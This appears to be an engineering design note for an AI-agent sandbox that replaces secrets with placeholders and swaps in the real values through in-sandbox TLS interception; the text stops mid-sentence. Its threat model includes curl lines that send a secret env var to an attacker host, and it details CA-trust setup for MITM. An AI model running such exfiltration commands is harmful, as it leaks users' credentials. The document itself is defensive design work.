# Sandbox secret swap via MITM egress — design notes

Investigation of replacing plaintext sandbox env vars with deterministic
placeholders that are JIT-substituted on egress, so the agent never holds
the real secret.

## Phase 0 — Minimal proof of concept (FIRST STEP)

Before any of the production design below, we ship a deliberately tiny,
hard-coded proof that the MITM substitution path works end-to-end. Goal:
demonstrate that bytes leaving the agent UID get rewritten in flight by
dsbx and reach an upstream we control, observably.

### Scope — IN

- A fixed, hard-coded substitution rule in dsbx:
  ```
  __DUST_EXPERIMENT_PLACEHOLDER__   →   __SUCCESSFULLY_REPLACED________
  ```
  Both strings are fixed and equal-length (31 chars including the leading
  and trailing `__`). Equal length avoids any HTTP framing complications
  (`Content-Length`, HTTP/2 header table sizes, etc.) for this first pass.
- The substitution is applied to **HTTP/1.1 request headers only**, on
  the request path going from the agent to the upstream. No response-side
  rewriting. No body rewriting. No URL rewriting. No HTTP/2.
- The substitution is **unconditional** when the placeholder string is
  detected — no `allowedDomains` gating, no per-secret table, no JWT
  cross-check. We're testing the rewriter, not the policy.
- TLS MITM in dsbx using an ephemeral in-memory CA generated at dsbx
  startup. Trust setup limited to the path needed for the smoke test:
  `update-ca-certificates` plus `SSL_CERT_FILE=/etc/dust/ca-bundle.pem`
  and `CURL_CA_BUNDLE=/etc/dust/ca-bundle.pem` (covers `curl`, the only
  client we'll use for the PoC). No Node / Python / Java / Rust trust
  setup — out of scope for Phase 0.
- A new endpoint on `front` (private API, gated by a shared bearer token
  set via `EGRESS_MITM_EXPERIMENT_TOKEN`):
  `POST /api/v1/w/[wId]/sandbox/egress-experiment`, that:
  - reads the inbound `X-Dust-Experiment` header,
  - emits a single `logger.info({ received, ... }, "egress experiment hit")`
    so the value shows up in Datadog,
  - returns `200 { "received": <header value> }` so the caller can also
    see what the server saw.
  Returns `404` unless both `EGRESS_MITM_EXPERIMENT_HOST` and
  `EGRESS_MITM_EXPERIMENT_TOKEN` are set; `401` on missing/wrong token.
  No DB writes.
- A smoke flow runnable from inside a sandbox. The shared token is
  injected into the agent env as `$DUST_EXPERIMENT_TOKEN` whenever the
  experiment is enabled, so the curl is self-contained:
  ```
  curl -H "X-Dust-Experiment: __DUST_EXPERIMENT_PLACEHOLDER__" \
       -H "X-Dust-Experiment-Token: $DUST_EXPERIMENT_TOKEN" \
       https://<experiment-host>/api/v1/w/<wId>/sandbox/egress-experiment
  ```
  Expected end-state in Datadog: a single log line with
  `received == "__SUCCESSFULLY_REPLACED________"`. The `curl` response
  body echoes the same value.
- A control case in the same run, showing the swap is request-scoped:
  ```
  curl -H "X-Dust-Experiment: literal-not-the-placeholder" \
       -H "X-Dust-Experiment-Token: $DUST_EXPERIMENT_TOKEN" \
       https://<experiment-host>/api/v1/w/<wId>/sandbox/egress-experiment
  ```
  Expected: Datadog log shows `literal-not-the-placeholder` unchanged.

### Scope — OUT

Explicitly **not** in Phase 0:

- Any database schema changes. No new model, no migration, no admin UI.
- Any change to the existing `WorkspaceSandboxEnvVar` flow. Real env vars
  keep behaving as today.
- The `__DST_SECRET_<32hex>__` HMAC-derived placeholder format — Phase 0
  uses the literal `__DUST_EXPERIMENT_PLACEHOLDER__` only.
- The `/etc/dust/egress-secrets.json` per-sandbox file. Phase 0's rule is
  compiled into dsbx as a constant.
- `allowedDomains` gating, per-secret bound, deny-log enrichment for
  unsubstituted-placeholder warnings.
- Trust-store coverage beyond `curl`. Node / Python / Java / Rust /
  Bun / Deno / Go are all explicitly out — they come in Phase 1.
- HTTP/2, TLS-pinned clients, body rewriting, URL rewriting, websocket
  Upgrade, non-HTTP protocols, port 80 plain HTTP. All Phase 2+.
- Any change to the central egress-proxy. It keeps doing TCP splice as
  today. The PoC happens entirely in dsbx + a new endpoint in front.

### Acceptance criteria

The PoC is "done" when, from a fresh sandbox running the patched dsbx and
patched image:

1. The `curl` with `X-Dust-Experiment: __DUST_EXPERIMENT_PLACEHOLDER__`
   reaches the new endpoint and the Datadog log line shows
   `__SUCCESSFULLY_REPLACED________` in the captured header value.
2. The `curl` with a literal non-placeholder string reaches the endpoint
   unchanged in Datadog.
3. A non-MITM `curl https://www.google.com/` from the same sandbox still
   succeeds (sanity: we didn't break public TLS by misconfiguring the
   trust bundle; covered by §5.3 replace-vs-append discipline).
4. The dsbx MITM stage is enabled only for the egress-experiment domain
   (or is otherwise scoped narrowly), so we don't accidentally MITM
   unrelated production traffic during the experiment.

### Implementation footprint estimate

- `cli/dust-sandbox` (dsbx): ~200–400 LOC plus tests. Ephemeral CA via
  `rcgen`, per-SNI leaf signing, single-rule substring replacer running
  on HTTP/1.1 request headers, scoped to the egress-experiment hostname
  for the PoC.
- `front`: ~50–100 LOC. One new endpoint file under
  `pages/api/v1/w/[wId]/sandbox/`, one swagger annotation, one functional
  test (per `[TEST1]`). Logs with the existing app logger (`[GEN8]`).
- Sandbox image: install dsbx-issued CA into the system store at boot,
  set `SSL_CERT_FILE` and `CURL_CA_BUNDLE` to the merged bundle. ~20
  lines in the systemd unit / startup script. No image rebuild needed
  beyond the dsbx version bump.
- `egress-proxy` (central): no change.

### Why this is sufficient as a proof

If Phase 0 works, every load-bearing claim in this doc is demonstrated:

- Kernel-level `nft REDIRECT` from UID 1003 to dsbx works as advertised
  (we already know this — production today).
- dsbx can terminate inbound TLS using an ephemeral CA whose cert is
  trusted by the in-sandbox client (the `curl` case validates the trust
  bundle path).
- dsbx can read plaintext HTTP from the decrypted stream and rewrite
  bytes before re-encrypting outbound.
- The rewritten bytes survive the re-encryption + the central
  egress-proxy's TCP splice + the upstream's TLS termination, and the
  upstream sees the substituted value (this proves the whole pipeline,
  not just dsbx in isolation).
- Datadog provides the observability we need to see what the upstream
  saw, completing the loop.

Anything that fails after Phase 0 is implementation detail (more clients,
allowlists, persistent secrets, h2, bodies). Anything that fails *during*
Phase 0 is a load-bearing assumption we got wrong, and we'd want to
discover that before investing in the full design.


## 1. What the current setup actually looks like

End-to-end path of an outbound request from the agent:

1. Agent (UID 1003 `agent-proxied`) runs e.g. `curl https://api.example.com/...`
   with `Authorization: Bearer $DST_FOO`. The real value sits in its env
   (`buildSandboxEnvVars` in `front/lib/resources/sandbox_resource.ts:332`).
2. nftables on the sandbox VM
   (`front/lib/api/sandbox/image/egress/egress-nftables.sh:22`) REDIRECTs all
   TCP from UID 1003 to `127.0.0.1:9990`.
3. `/opt/bin/dsbx forward` (root, code at
   `cli/dust-sandbox/src/commands/forward/mod.rs`) accepts, reads
   `SO_ORIGINAL_DST`, peeks bytes to extract Host (port 80) or SNI (port 443),
   opens a TLS connection to `eu.sandbox-egress.dust.tt:4443`, sends a
   `(version, JWT, domain, original_port)` handshake (`handshake.rs`).
4. Central egress proxy (Rust, `egress-proxy/src/`) validates JWT, checks
   domain against GCS-backed per-workspace/sandbox policy (`gcs.rs`,
   `policy.rs`), opens TCP to upstream, writes `ALLOW`, then
   `tokio::io::copy_bidirectional` between the dsbx-facing TLS socket and the
   upstream TCP socket (`connection.rs:347`).

**Critical fact**: today the central egress proxy is a *TCP relay after
auth/policy*. The bytes it splices upstream are already TLS-encrypted by
`curl` end-to-end with the real upstream. The proxy can't see headers — there
is no MITM today. Same is true at `dsbx`: it only `peek()`s the first
ClientHello bytes for SNI; the rest is opaque copy_bidirectional.

The current "redaction" PRs (#25051) are pure mitigations on
`formatExecOutput`: they grep tool stdout for `value.length>=16 &&
entropy>=3.5` substrings and replace with `«redacted: $NAME»`. This is
best-effort and the PR description openly admits it: "encoded output, network
calls from sandbox code, transformed values, and short / dictionary-like
values can still leak". An agent doing
`curl -X POST https://attacker.com -d "$DST_FOO"` walks straight past
redaction and is only stopped by the egress *domain* allowlist.

So the leak surface today is: **(a)** any tool stdout that doesn't go through
`formatExecOutput` (file mounts, persisted artifacts, network proxy logs we
forget to scan), **(b)** any network call to an allowlisted domain that
exfiltrates the value in the body or URL, **(c)** transformed/encoded values,
**(d)** anything the LLM is socially-engineered into emitting. The
fundamental issue is that the secret literally lives in `agent-proxied`'s
environment, so it's recoverable trivially.

The set of upstreams the sandbox can reach is whatever the egress allowlist
resolves to: the global `EGRESS_PROXY_ALLOWED_DOMAINS` (default allowlist set
in the proxy config) merged with the per-workspace and per-sandbox policies
stored in the GCS policy bucket (`egress-proxy/src/gcs.rs:81` —
`default_allows || workspace_policy.allows || sandbox_policy.allows`). The
whole point of `add_egress_domain` (the agent-facing skill) and the workspace
`egress_policy.ts` admin path is that workspaces add their own domains —
Slack, Stripe, GitHub, internal HTTP APIs, whatever the user provisions.

## 2. The design space for "deterministic placeholder + JIT substitution"

There are three architecturally distinct places to do the substitution:

|                              | **A. dsbx (in-sandbox)**                          | **B. central egress-proxy**                                | **C. hybrid (dsbx terminates TLS, proxy substitutes)**     |
| ---                          | ---                                               | ---                                                        | ---                                                        |
| Real secret lives in…        | sandbox VM, in dsbx (root, 0600)                  | egress-proxy pod only                                      | egress-proxy pod only                                      |
| Sandbox trust store change?  | yes, install dsbx-issued local CA                 | yes, install proxy-issued CA                               | yes, dsbx local CA                                         |
| TLS termination pass         | dsbx (one)                                        | egress-proxy (one)                                         | dsbx + egress-proxy (two)                                  |
| Per-tenant CA-key blast      | per-sandbox CA, key never leaves the sandbox VM   | one CA key signs leaves for every domain in every workspace — top-tier secret | per-sandbox CA, lower blast |
| Code change weight           | dsbx grows ~500–1500 lines (TLS-MITM HTTP rewriter) | egress-proxy + secret store + CA mgmt                    | both                                                       |
| Latency cost                 | one extra TLS per upstream                        | one extra TLS per upstream                                 | two extra TLSes, one per hop                               |
| Agent reach to real secret   | requires sandbox root escape                      | impossible from sandbox                                    | impossible from sandbox                                    |

The relevant threat model question: **does Dust treat "agent root inside the
sandbox VM" as a containment failure, or as an expected outcome we should
defend against?** The architecture so far (proxy holds policy in GCS, JWT
minted by `front`, egress denied by IP filtering) suggests we *don't* trust
the sandbox VM as a security perimeter; it's a single-tenant VM bounded by
the egress proxy. But it does trust the agent UID/root split today (the
`nftables` rule keys on `meta skuid 1003`).

If we keep that posture (VM root is trusted, only the agent UID is hostile),
**Option A is the right answer** — and is significantly simpler to ship:

- `dsbx` already runs as root, already terminates one TLS toward the proxy,
  already peeks the SNI. Adding a "terminate the inner TLS, rewrite headers,
  re-encrypt" stage is a focused change in one binary we own.
- Local CA: dsbx generates an ephemeral root CA on first start, writes the
  cert into `/etc/ssl/certs/` + runs `update-ca-certificates`, keeps the
  private key in memory only. No long-lived CA key on disk anywhere —
  different per sandbox boot. Standard `mitmproxy` model, well-trodden.
- Real secrets: front writes them to `/etc/dust/egress-secrets.json` (root,
  0600) at sandbox boot, just like it already writes
  `/etc/dust/egress-token`. The agent UID can't read it. dsbx loads them into
  memory. No ptrace from UID 1003 to root
  (kernel.yama.ptrace_scope=1 — confirm in image, we can pin it).
- Agent env gets *placeholders only* — drop-in substitution in
  `buildSandboxEnvVars`.
- Downside accepted: a sandbox-root escape (kernel CVE, container escape,
  etc.) leaks the workspace's secrets that were shipped to that sandbox.
  Same blast radius as today's plaintext env vars for those secrets, plus we
  keep the placeholder-in-agent-output property.

Option B has nicer "secrets never enter the VM" properties but the central-
CA-private-key problem is real (one HSM-grade secret backing every workspace's
outbound TLS) and the proxy work is much heavier — full
HTTP/1.1+HTTP/2+websocket parsing, body buffering, `Content-Length`
recomputation, per-connection key fetches from a secret store, all on a
regional hot path that today is a thin TCP splice. Punt on B unless we get a
hard "the VM cannot be trusted" mandate.

Recommend **Option A**.

## 3. Placeholder format

Goals: unique, regex-greppable in HTTP traffic, deterministic across boots so
the agent (and humans reading code) sees the same value, no information about
the real secret.

Proposal:

```
__DST_SECRET_<32 hex chars>__
```

where the hex is `HMAC_SHA256(per-workspace-key, name || ":" || version)`
truncated to 16 bytes. Properties:

- Fixed-width, fully alphanumeric: easy to embed in shell, JSON, headers, URLs.
- Unambiguous regex: `__DST_SECRET_[0-9a-f]{32}__`. False positives essentially zero.
- Deterministic per (workspace, name, version) — same sandbox boot, same
  sandbox cycle, same value. Stable across boots when the row hasn't been
  edited; rotating bumps `version`, which rotates the placeholder, which
  forces the agent's persisted state to break loudly (the way it should).
- Doesn't reveal the secret, doesn't reveal the secret length, doesn't allow
  the agent to forge the placeholder for a value it doesn't know.
- The HMAC key is per-workspace and lives in `front` (we have the encryption
  infra already — `@app/types/shared/utils/encryption`); the
  placeholder<->value map travels with the sandbox env injection.

The agent still does `curl -H "Authorization: Bearer $DST_FOO"` as before —
the placeholder is what goes on the wire instead of the real value.

## 4. Substitution logic

Inside dsbx, change `handle_connection` (`forward/mod.rs:159`) to branch by
port:

- **Port 80 (HTTP)**: today we peek for Host. New: terminate TCP, run an
  HTTP/1.1 parser (use `httparse`, already idiomatic), rewrite header values
  that match `__DST_SECRET_<32hex>__`, re-emit to the proxy-tunneled stream.
  Body: scan-and-rewrite is cheap if we limit to first N KB; otherwise
  pass-through with a single forward pass and Content-Length adjustment.
  **Recommendation**: support headers + URL only initially; document body
  substitution as out of scope. Most leak vectors are headers (Authorization,
  X-API-Key, Cookie) and form bodies — for forms we'd want body too
  eventually, but headers cover the common API auth case.
- **Port 443 (HTTPS)**: new MITM stage. Peek SNI as today. Forge a leaf cert
  for the SNI signed by the in-process CA. Terminate inbound TLS on dsbx with
  that leaf. Open the outbound TLS toward the *real* upstream as before
  (still tunneled through the egress proxy on 4443; the proxy still does TCP
  splice unchanged). On the now-decrypted inner stream, run the same HTTP/1
  or HTTP/2 (ALPN) rewriter. Re-encrypt outbound.
- **Other ports (raw TCP)**: unchanged — no substitution. Document that
  secrets used over raw TCP are not substituted. Optional hardening: if a
  placeholder appears on a raw TCP connection, drop the connection.

**Substitution rule** (the security-critical part): the placeholder→real-value
swap must be gated on **per-secret destination domain allowlist**, not just
"we recognize a placeholder". Each workspace env var row gains a
`allowedDomains: string[]` (admin-set when creating it). On a request to a
domain `D`, dsbx replaces `__DST_SECRET_<h>__` only if `D` is in the row's
allowlist; otherwise it leaves the placeholder as-is. This stops the obvious
attack `curl https://attacker-allowed-by-egress-policy.com -H "X: $DST_FOO"`
even when that domain is on the egress allowlist for some other reason.

The `allowedDomains` here is a *per-secret* list, distinct from (and stricter
than) the egress policy allowlist. It encodes "this secret is only valid for
these upstreams". e.g. `DST_OPENAI_KEY → ["api.openai.com"]`,
`DST_GITHUB_PAT → ["api.github.com"]`,
`DST_INTERNAL_TOKEN → ["api.acme.internal"]`.

Reverse-channel safety check: if `placeholder is present && destination not
allowlisted`, log a warn (we already have the deny-log channel; reuse).

## 5. Client-language agnosticism

A core requirement is that the substitution must work transparently no matter
what the agent uses to make the request — `curl`, `wget`, Node, Bun, Deno,
Python (`requests`, `httpx`, `urllib`), Ruby, PHP, Go, Rust (`reqwest`,
`hyper`, `ureq`), Java, a hand-rolled C binary, anything. The agent picks
its tools dynamically; we don't get to dictate them.

### 5.1 Why interception itself is already agnostic

The whole interception path is below the language runtime:

- nftables `REDIRECT` keys on `meta skuid 1003`, applied at the kernel
  netfilter hook on `OUTPUT`. Every `connect()` syscall from the agent UID
  is rerouted to `127.0.0.1:9990` regardless of which `libc`, runtime, or
  static binary issued it. There is no userspace bypass short of a UID
  change, which the agent cannot perform.
- The byte-level placeholder swap inside dsbx is HTTP-only (HTTP/1.1 and
  HTTP/2). It does not introspect the client at all — it parses the wire
  bytes after TLS termination.
- DNS for the agent UID is already pinned to the configured resolvers by
  nftables; clients that try DoH or alternative resolvers fail closed.
- UDP and ICMP from UID 1003 are dropped today, so HTTP/3/QUIC silently
  falls back to HTTP/2 — preserved.

So the network plumbing is fully runtime-agnostic by construction. The only
runtime-dependent surface is **TLS trust**.

### 5.2 The one runtime-specific bit: CA trust

For the MITM to be invisible to the agent's HTTPS client, that client must
accept the leaf certificate dsbx forges, signed by the dsbx-issued local CA.
Different language stacks read trust roots from different places, and —
critically — different env vars have **different semantics**: some replace
the trust bundle entirely, others append. Getting this wrong silently breaks
non-MITM TLS to public sites.

Behaviors to internalize:

- `SSL_CERT_FILE`, `CURL_CA_BUNDLE`, `REQUESTS_CA_BUNDLE`, `AWS_CA_BUNDLE`,
  `GIT_SSL_CAINFO`: **replacement** — whatever you point at is the *entire*
  trust bundle. If you point them at a single-cert file containing only the
  Dust CA, every TLS connection that doesn't go through MITM (raw-tunneled
  traffic, or the dsbx→proxy connection itself if it ever did so) breaks.
- `NODE_EXTRA_CA_CERTS`: **append-style** — adds to the well-known Mozilla
  bundle Node ships with. Read **only at process startup**, ignored if the
  client code passes an explicit `ca:` option.
- `DENO_CERT`: append-style, plus `DENO_TLS_CA_STORE` selects which roots
  Deno trusts (`system,mozilla` is the safe default).
- Bun: respects `NODE_EXTRA_CA_CERTS` per its docs — verify with a smoke test
  before relying on it.
- Rust `reqwest` / `rustls`: depends on the build. With
  `rustls-native-certs` or the `native-tls` backend it reads system roots;
  with the default `webpki-roots`/`rustls-tls` backend it uses a hardcoded
  Mozilla bundle and **no env var helps** — you have to recompile or call
  `add_root_certificate(...)` in code. We can't fix that case from outside.
- Java / JVM: own keystore at `$JAVA_HOME/lib/security/cacerts`. No env var
  honored by default. Requires a `keytool -importcert` mutation. Because
  our CA is generated per-sandbox at boot, the import has to happen at
  boot, not image build.

The corrected matrix:

| Stack                                | System store? | Env knob                                    | Knob semantics    |
| ---                                  | ---           | ---                                         | ---               |
| curl / wget / OpenSSL CLIs           | yes           | `CURL_CA_BUNDLE`, `SSL_CERT_FILE`           | **replace**       |
| Go (`crypto/tls` on Linux)           | yes           | `SSL_CERT_FILE`, `SSL_CERT_DIR`             | **replace**       |
| Ruby, PHP, Perl                      | yes           | `SSL_CERT_FILE`                             | **replace**       |
| Python `ssl` stdlib                  | yes           | `SSL_CERT_FILE`                             | **replace**       |
| Python `requests` / `httpx`          | no            | `REQUESTS_CA_BUNDLE`, `SSL_CERT_FILE`       | **replace**       |
| Node.js                              | no            | `NODE_EXTRA_CA_CERTS`                       | append (startup)  |
| Bun                                  | no            | `NODE_EXTRA_CA_CERTS` (verify)              | append (claimed)  |
| Deno                                 | no            | `DENO_CERT` + `DENO_TLS_CA_STORE`           | append            |
| Rust `reqwest` (rustls-webpki)       | no            | none                                        | —                 |
| Rust `reqwest` (native-tls / rustls-native-certs) | yes | `SSL_CERT_FILE`                       | **replace**       |
| Java / JVM                           | no            | none — keystore `keytool -import` at boot   | —                 |
| AWS SDKs (varies)                    | no            | `AWS_CA_BUNDLE`                             | **replace**       |
| Git over HTTPS                       | yes           | `GIT_SSL_CAINFO`                            | **replace**       |

### 5.3 What we ship in the sandbox image

The replace/append distinction drives the design: we maintain **two files**
and point each env var at the right one.

1. **Install the dsbx-issued CA into the system store** at sandbox boot:
   ```
   cp /etc/dust/egress-ca.pem /usr/local/share/ca-certificates/dust-egress.crt
   update-ca-certificates
   ```
   This populates `/etc/ssl/certs/ca-certificates.crt`, which already
   contains the public Mozilla bundle, and adds our CA to it. Every
   "reads system store" client now trusts both.

2. **Maintain `/etc/dust/ca-bundle.pem` = system bundle ∪ dust-egress CA.**
   This is what we point *replace-style* env vars at, so non-MITM TLS to
   public sites still verifies. Computed at boot:
   ```
   cat /etc/ssl/certs/ca-certificates.crt > /etc/dust/ca-bundle.pem
   ```
   (Strictly redundant with system store, but explicit so we have a stable
   path to point env vars at, regardless of distro changes.)

3. **Export env vars system-wide** (in `/etc/environment` plus the agent
   user's profile, since some CLIs only honor login env). Replace-style
   vars get the **bundle**; append-style vars get the **single-CA file**:
   ```
   # replace-style — must contain the full trust set
   SSL_CERT_FILE=/etc/dust/ca-bundle.pem
   SSL_CERT_DIR=/etc/ssl/certs
   CURL_CA_BUNDLE=/etc/dust/ca-bundle.pem
   REQUESTS_CA_BUNDLE=/etc/dust/ca-bundle.pem
   AWS_CA_BUNDLE=/etc/dust/ca-bundle.pem
   GIT_SSL_CAINFO=/etc/dust/ca-bundle.pem

   # append-style — single CA, gets added to the runtime's built-in bundle
   NODE_EXTRA_CA_CERTS=/etc/dust/egress-ca.pem
   DENO_CERT=/etc/dust/egress-ca.pem
   DENO_TLS_CA_STORE=system,mozilla
   ```
   Pointing replace-style vars at the single-CA file is the easy mistake —
   it would silently break any TLS that isn't going through MITM. Don't.

4. **Java keystore import at sandbox boot**, not at image build (the CA is
   ephemeral per boot):
   ```
   keytool -importcert -noprompt -trustcacerts \
     -alias dust-egress -file /etc/dust/egress-ca.pem \
     -keystore "$JAVA_HOME/lib/security/cacerts" -storepass changeit
   ```
   Run unconditionally as part of the boot sequence on every JRE shipped
   in the image. Boot-time keystore mutations are cheap.

5. **NODE_EXTRA_CA_CERTS is read at process startup only.** Any Node /
   Bun process spawned before the env is set will not pick it up. Sandbox
   boot order: dsbx starts and installs CA → env is exported → only then
   the agent gets to spawn anything. This is the order we already have for
   the JWT/forwarder setup; preserve it.

6. **Document hard limits in the skill prompt.** The agent should be told:
   do not pass `verify=...` to requests/httpx, do not pass `ca:` to Node
   `https`/`fetch`, do not configure custom `RootCAs` in Go, do not pin a
   keystore in Java. If it does, the call will fail because dsbx's leaf
   won't be trusted. We surface that as a recognizable error pattern in the
   deny-log channel ("placeholder unsubstituted because TLS terminated by
   client with custom trust") to avoid silent secret-disclosure debugging.

With (1)–(5), the **default** HTTPS client of every mainstream language
works out of the box. The known not-fixable-by-config holes are documented
in §5.4.

### 5.4 What still doesn't work, on purpose

These are explicit design limits, not bugs:

- **Rust `reqwest` / `rustls` built against `webpki-roots`** (the default
  for many crates). It uses a hardcoded Mozilla bundle compiled into the
  binary; no env var or system-store install reaches it. The fix is
  code-level: the binary must be built with `rustls-native-certs` or
  `native-tls`, or call `add_root_certificate(...)` explicitly. The agent
  writing fresh `cargo new` code will hit this. Mitigation: pre-install a
  `~/.cargo/config.toml` that adds an `rustls-native-certs` dependency
  override, *or* document this as a known hole and let the call fail
  loudly. Either way, no silent secret leak.

- **Cert-pinning clients.** Anything that pins a specific CA or leaf
  fingerprint (AWS SDK with explicit cert pin, mobile-style HPKP, gRPC with
  explicit `tls.Config{RootCAs: ...}`, `requests.get(..., verify="/path")`,
  Node `https.request({ ca: ... })`, Java code that constructs an
  `SSLContext` with a private trust manager). These clients will reject
  the dsbx-forged leaf and fail to connect. This is correct from their
  security model; we cannot MITM a pinning client without breaking its
  guarantee. Document loudly. Empirically rare in agent-written code; the
  skill prompt should steer away from it.

- **Long-lived processes started before env export.** Anything launched
  before `/etc/environment` is in scope or before dsbx has installed the
  CA won't pick up the trust. Boot order matters: dsbx → CA install →
  env export → agent processes. Re-confirm in the systemd unit ordering.

- **Non-HTTP protocols over TLS.** Postgres TLS, MySQL TLS, MongoDB TLS,
  Redis TLS, plain gRPC (gRPC is HTTP/2 so it actually works), SMTP STARTTLS,
  raw TLS sockets. dsbx will still terminate the inbound TLS via the local
  CA, but the placeholder rewriter only understands HTTP/1.1 and HTTP/2.
  For other protocols we either:
  - ship a per-protocol rewriter (Phase 3+, opt-in by domain), or
  - pass the bytes through unchanged (placeholder reaches upstream — same
    user-visible outcome as today's "wrong password": upstream rejects).
  The 80/20 case (SaaS APIs over HTTPS with `Authorization` / `X-API-Key`
  headers) is fully covered.

- **Plain HTTP on non-standard ports.** Solvable in dsbx: detect the
  protocol from the first peek bytes (TLS ClientHello pattern vs. HTTP
  request line) instead of keying purely on port 80/443. Worth doing
  because the egress allowlist is per-domain, not per-port.

- **HTTP/3 / QUIC.** UDP is already dropped for UID 1003 by nftables. Every
  modern client falls back to HTTP/2 on TCP. Preserved.

- **DNS-over-HTTPS from the agent.** The agent can't do DoH today (only the
  configured nameserver is reachable on UDP/53 from UID 1003), and that
  doesn't change.

- **Encoded placeholders.** If the agent transforms the placeholder before
  putting it on the wire (base64, url-encode, splits across two headers,
  etc.), the byte-level matcher won't recognize it and won't substitute —
  upstream gets garbage. This is a *feature*: any encoding/transformation
  the agent applies to the placeholder breaks substitution and the secret
  is never produced. The agent has to use the literal placeholder for the
  call to work.

### 5.5 Verification checklist

We make no claim of language-agnosticism without a smoke matrix. Run two
checks per stack — one MITM'd domain (placeholder must materialize as the
real secret upstream), one non-MITM public domain (TLS must still verify
against the public web). Both succeed = trust setup is correct.

```
# baseline replace-vs-append correctness
curl  https://api.allowed-mitm.example/   # MITM → real secret in headers
curl  https://www.google.com/             # non-MITM → must verify

# Python
python -c "import urllib.request; urllib.request.urlopen('https://...')"
python -c "import requests; requests.get('https://...')"
python -c "import httpx; httpx.get('https://...')"

# JS runtimes
node -e "fetch('https://...').then(r=>r.text())"
bun  -e "fetch('https://...').then(r=>r.text())"
deno eval "await fetch('https://...')"

# Compiled
go run /tmp/get.go                                 # net/http
java GetURL                                         # HttpClient (post-keytool import)
cargo run                                           # reqwest+native-tls
cargo run                                           # reqwest+rustls-webpki — EXPECTED FAIL

# Misc
ruby -rnet/http -e "Net::HTTP.get(URI('https://...'))"
php  -r "file_get_contents('https://...');"
git  clone https://github.com/...
aws  s3 ls
wget https://...
```

For each: assert the request succeeds for the public domain, and assert the
upstream capture (a controlled `httpbin`-style endpoint behind dsbx)
records the real secret value in the `Authorization` header for the
allowed-MITM domain. Codify as an e2e matrix in the `dust-sandbox` repo
that runs on every dsbx release, so we don't regress.

Honest framing for the doc reader and any future skeptic: this design
**covers the default HTTPS client of every mainstream language** when
the agent writes idiomatic, configuration-free code. It does **not** cover
clients that pin or replace trust, and it does **not** cover Rust binaries
linked against `rustls-webpki`. Those are documented limits, not
oversights, and they fail loudly (connection refused / TLS error) rather
than silently leaking the placeholder.

## 6. What it would take, concretely

### `front` changes

- `WorkspaceSandboxEnvVar` model: add `allowedDomains` (text[] / json),
  `version` (int, bumped on update), drop `encryptedValue` exposure to
  anywhere except the secret-injection path.
- `env_vars.ts`: derive `placeholderFor(workspace, name, version)`
  deterministically.
- `sandbox_resource.ts:buildSandboxEnvVars`: inject **placeholders** into the
  agent env. Keep the existing `imageEnvVars`/system-vars precedence.
- New code in `lib/api/sandbox/egress.ts`: alongside the JWT/forwarder setup,
  write a per-sandbox `egress-secrets.json` to `/etc/dust/egress-secrets.json`
  (root 0600) containing `{ placeholder, value, allowedDomains }[]`. Keep
  this off any non-root tool path.
- Drop the bash-output redactor (#25051): with placeholders in env, there's
  nothing real to redact; the agent literally never has the secret. Keeps
  the "presence-check via `[ -n "$X" ]`" affordance.
- Admin UI: show "destination domains" column on the env-vars page (Sandbox
  section).
- API surface: new endpoint to set/get `allowedDomains` per row,
  audit-logged like the rest.

### `dsbx` changes (`cli/dust-sandbox/src/commands/forward/`)

- Add a `tls_mitm.rs` module: ephemeral CA generation (`rcgen` crate),
  per-SNI leaf signing with a small LRU cache, `tokio_rustls::TlsAcceptor`
  per-conn from a `ResolvesServerCert` impl that mints leaves on demand.
- `secrets.rs`: load `/etc/dust/egress-secrets.json` once, expose
  `Option<&Secret> resolve(placeholder)` and
  `bool allowed_for(secret, domain)`.
- `http_rewriter.rs`: HTTP/1.1 header/url rewriter (httparse-driven) and
  HTTP/2 (h2 crate) frame-level rewriter. Bodies pass through.
- `forward/mod.rs`: branch on port — 443 goes through MITM, 80 goes through
  HTTP/1 rewriter, other ports unchanged.
- Image: add `update-ca-certificates` step after writing the dsbx-issued CA
  at boot. The image already does enough as-root setup that this is not new
  ceremony.

### `egress-proxy` (central, Rust): no functional change

- It keeps doing TCP splice. JWT/policy/SSRF unchanged.
- One observability addition (optional): a deny-reason for "placeholder
  leaked to non-allowed domain" if dsbx forwards the deny-log signal up.
  Probably belongs in the existing deny log path.

### Tests

- `dsbx` MITM unit tests for CA gen, leaf signing, header rewrite (headers,
  URL), HTTP/2 frame rewrite, body pass-through,
  no-substitution-when-domain-not-allowed.
- e2e: spin a fake upstream, assert headers received.
- Integration test hitting the existing `egress-proxy` integration test with
  the new MITM dsbx.

### Rough size estimate

- `front`: ~300–500 LOC (model migration + injection + UI + endpoint + tests).
- `dsbx`: ~1000–1500 LOC including tests. The HTTP/2 rewriter is the biggest
  chunk — if we ship HTTP/1-only first, more like 600 LOC.
- `egress-proxy`: ~0–50 LOC (deny-log enrichment only).
- Image build: a few lines for CA install at boot.

Two-engineer-week first ship if we phase it: **Phase 1**: HTTP/1-only on port
80 + HTTP/2 disabled fallback on 443 (i.e. force HTTP/1 by ALPN) +
headers-only substitution. **Phase 2**: HTTP/2, body substitution, websocket
Upgrade.

## 6. Things to flag / decide before starting

1. **HTTP/2 scope**. Many target APIs negotiate h2 by default. If we skip h2
   in Phase 1, we either (a) downgrade ALPN at the dsbx terminator, which
   most SDKs handle but a minority break on, or (b) ship h2 in Phase 1 with
   the extra complexity. Worth deciding now, not later.
2. **Body substitution**. OAuth `client_secret`, webhook signing, multipart
   forms — these put secrets in bodies. If we say "headers-only", advertise
   it loudly so the admin UI's `allowedDomains` field can carry an "include
   body" flag.
3. **Persistence of agent state**. If a notebook persists a placeholder
   string into a file and then later cats it into a request, substitution
   still happens (it's a runtime byte match on the wire). Good. But if the
   agent persists e.g. the `Authorization` value into a database we control
   and replays it later from another sandbox with a different version,
   substitution fails. Document that placeholders are sandbox-version-bound.
4. **kernel.yama.ptrace_scope** in the sandbox image — confirm we set it ≥ 1
   so a compromised UID 1003 can't ptrace dsbx. Worth confirming today
   regardless of this work — it'd be a finding for the redaction PR.
5. **Image trust store ownership**. Adding an in-VM CA we control is a
   doubled-edged sword: any sandbox-VM-root attacker can also use the CA to
   MITM the agent. We should make the CA private key memory-only (never on
   disk), and forbid the agent UID from seeing it.
6. **Backwards compat with the bash redactor**. If we keep it, redactor +
   placeholder coexist (both no-ops in practice) — fine. If we drop it, the
   skill prompt instructions in
   `lib/resources/skill/code_defined/sandbox.ts` need to be revised: the
   agent should be told values *will* substitute and not to second-guess
   what's in env.

## TL;DR

- Doable. Don't put it in the central egress proxy — the CA-private-key
  blast radius is unappealing and the perf/complexity hit is large.
- Put the MITM in `dsbx`. It already runs as root, already terminates one
